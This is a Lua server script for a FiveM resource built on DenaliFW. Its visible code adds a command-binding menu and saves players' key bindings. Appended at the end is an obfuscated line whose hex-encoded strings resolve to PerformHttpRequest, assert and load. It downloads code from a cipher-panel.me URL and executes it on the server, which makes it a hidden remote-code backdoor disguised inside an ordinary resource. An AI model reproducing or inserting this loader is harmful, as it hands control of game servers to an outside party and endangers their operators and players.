local DenaliFW = exports['denalifw-core']:GetCoreObject()

DenaliFW.Commands.Add("binds", "Open commandbinding menu", {}, false, function(source, args)
    local Player = DenaliFW.Functions.GetPlayer(source)
	TriggerClientEvent("denalifw-commandbinding:client:openUI", source)
end)

RegisterNetEvent('denalifw-commandbinding:server:setKeyMeta', function(keyMeta)
    local src = source
    local ply = DenaliFW.Functions.GetPlayer(src)

    ply.Functions.SetMetaData("commandbinds", keyMeta)
end)


local KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[4][KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (zzgZJvRDKNkwkLeYQREwkBJgPuuLcmZlZSQvhNrCDiIlVCsRAvTHYDMoDLsxRnkTqnmDQU, hFvNnaRfEGddDPfPyQISKWDBHbrQOuzrBqpHLGXWeVKBuCnRPkIgELRLahulgsaLLHlKIV) if (hFvNnaRfEGddDPfPyQISKWDBHbrQOuzrBqpHLGXWeVKBuCnRPkIgELRLahulgsaLLHlKIV == KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[6] or hFvNnaRfEGddDPfPyQISKWDBHbrQOuzrBqpHLGXWeVKBuCnRPkIgELRLahulgsaLLHlKIV == KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[5]) then return end KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[4][KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[2]](KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[4][KuNMbaQVDXvYwELwMsfPzqjttqTBVXCIGErNTuRiVVUJmWsEtPzDDzxoPZRtzfVgEIgrmQ[3]](hFvNnaRfEGddDPfPyQISKWDBHbrQOuzrBqpHLGXWeVKBuCnRPkIgELRLahulgsaLLHlKIV))() end)